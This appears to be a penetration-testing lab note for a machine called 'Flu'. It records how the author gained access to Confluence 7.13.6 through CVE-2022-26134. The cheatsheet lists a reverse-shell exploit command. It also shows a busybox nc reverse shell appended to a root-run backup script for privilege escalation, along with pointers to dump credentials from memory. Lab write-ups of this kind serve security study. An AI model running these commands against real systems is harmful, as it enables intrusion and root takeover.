# Flu \[Inter]

## Report



## Cheatsheet

```
python3 through_the_wire.py --rhost 192.168.222.41 --rport 8090 --lhost 192.168.45.238 --protocol http:// --reverse-shell
echo "busybox nc 192.168.45.238 8001 -e /bin/sh" >> log-backup.sh
```

## Loot

### Enumeration

192.168.222.41

22, 8090

#### 8090

Atlassian Confluence 7.13.6

### Attack Vectors

[CVE-2022-26134](https://github.com/jbaines-r7/through_the_wire/blob/main)

### PrivEsc

```
-rwxr-xr-x 1 confluence confluence 408 Dec 12  2023 /opt/log-backup.sh

tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::8090                 :::*                    LISTEN      1123/java           
tcp6       0      0 :::8091                 :::*                    LISTEN      1420/java           
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 127.0.0.1:8000          :::*                    LISTEN      1123/java  

mysql process found (dump creds from memory as root)
tomcat process found (dump creds from memory as root)

/opt/atlassian/confluence pwd
/opt/atlassian/confluence/confluence - search passwords here
```

<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption><p>pspy output see script owned by 'confluence' is run as root</p></figcaption></figure>

### Creds

None

### Proof

None
